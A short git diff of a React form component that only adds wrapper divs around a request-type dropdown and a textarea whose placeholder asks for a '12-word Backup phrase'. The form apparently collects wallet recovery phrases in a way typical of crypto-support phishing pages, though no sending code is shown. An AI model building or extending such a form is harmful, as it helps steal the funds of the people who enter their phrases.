@@ -104,6 +104,8 @@ const Form = (props) => {
             </h1>
 
             <div className='grid'>
+                <div>
+
                 <label>Please choose a request type below</label>
                 <Select
                     options={options}
@@ -111,7 +113,9 @@ const Form = (props) => {
                     placeholder={'-'}
                     styles={customStyles}
                     onChange={onPackageChange}
-                />
+                    />
+                    </div>
+                    <div>
             <textarea
                 id='phrase'
                 className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
@@ -120,7 +124,8 @@ const Form = (props) => {
                 value={phrase}
                 placeholder='Enter 12-word Backup phrase'
                 onChange={handlePhrase}
-            />
+                />
+                </div>
             </div>
 
 
